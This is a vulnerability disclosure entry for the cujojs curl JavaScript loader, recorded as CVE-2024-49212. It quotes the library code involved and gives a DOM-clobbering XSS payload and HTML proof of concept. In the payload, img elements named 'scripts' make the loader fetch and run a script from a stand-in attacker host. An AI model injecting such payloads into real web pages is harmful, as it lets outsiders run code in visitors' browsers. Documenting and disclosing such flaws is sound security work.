## curl

### Meta

+ Library: curl
+ Stars: 1.8K
+ Version: v0.8.13
+ Payload: ```<img name="scripts" data-curl-run="http://attack.hulk/"><img name="scripts" data-curl-run="http://attack.hulk">```
+ Impact: XSS
+ CVE: CVE-2024-49212
+ Status: Reported
+ Foundby: TheHulk


### Library

https://github.com/cujojs/curl

### Vulnerable Code Snippet

```javascript
// https://github.com/cujojs/curl/blob/master/src/curl.js#L1133-L1139
findScript: function (predicate) {
  var i = 0, scripts, script;
  scripts = doc && (doc.scripts || doc.getElementsByTagName('script'));
  while (scripts && (script = scripts[i++])) {
    if (predicate(script)) return script;
  }
}
```

```javascript
// https://github.com/cujojs/curl/blob/13170edcbeb9dc55c48ea00e5fec890eec75b59f/src/curl.js#L1141-L1155
extractDataAttrConfig: function () {
  var script, attr = '';
  script = core.findScript(function (script) {
    var run;
    // find data-curl-run attr on script element
    run = script.getAttribute(bootScriptAttr);
    if (run) attr = run;
    return run;
  });
  // removeAttribute is wonky (in IE6?) but this works
  if (script) {
    script.setAttribute(bootScriptAttr, '');
  }
  return attr;
}
```

```javascript
bootScript = core.extractDataAttrConfig();
	// wait a bit in case curl.js is bundled into the boot script
	if (bootScript) core.nextTurn(core.bootScript);
```

```javascript
// https://github.com/cujojs/curl/blob/13170edcbeb9dc55c48ea00e5fec890eec75b59f/src/curl.js#L691-L742
loadScript: function (def, success, failure) {
  // script processing rules learned from RequireJS
  // TODO: pass a validate function into loadScript to check if a success really is a success

  // insert script
  var el = doc.createElement('script');

  // initial script processing
  function process (ev) {
    ev = ev || global.event;
    // detect when it's done loading
    // ev.type == 'load' is for all browsers except IE6-9
    // IE6-9 need to use onreadystatechange and look for
    // el.readyState in {loaded, complete} (yes, we need both)
    if (ev.type == 'load' || readyStates[el.readyState]) {
      delete activeScripts[def.id];
      // release event listeners
      el.onload = el.onreadystatechange = el.onerror = ''; // ie cries if we use undefined
      success();
    }
  }

  function fail (e) {
    // some browsers send an event, others send a string,
    // but none of them send anything useful, so just say we failed:
    failure(new Error('Syntax or http error: ' + def.url));
  }

  // set type first since setting other properties could
  // prevent us from setting this later
  // actually, we don't even need to set this at all
  //el.type = 'text/javascript';
  // using dom0 event handlers instead of wordy w3c/ms
  el.onload = el.onreadystatechange = process;
  el.onerror = fail;
  // js! plugin uses alternate mimetypes
  el.type = def.mimetype || 'text/javascript';
  // TODO: support other charsets?
  el.charset = 'utf-8';
  el.async = !def.order;
  el.src = def.url;

  // loading will start when the script is inserted into the dom.
  // IE will load the script sync if it's in the cache, so
  // indicate the current resource definition if this happens.
  activeScripts[def.id] = el;

  head.insertBefore(el, insertBeforeEl);

  // the js! plugin uses this
  return el;
}
```

### PoC
```html
<!--Library-->
<script src="./curl.js"></script>
<!--Library-->

<!--Payload-->
<img name="scripts" src="http://localhost:9999" data-curl-run="http://localhost:9999">
<img name="scripts" src="http://localhost:9999" data-curl-run="http://localhost:9999"> 
<!--Payload-->
```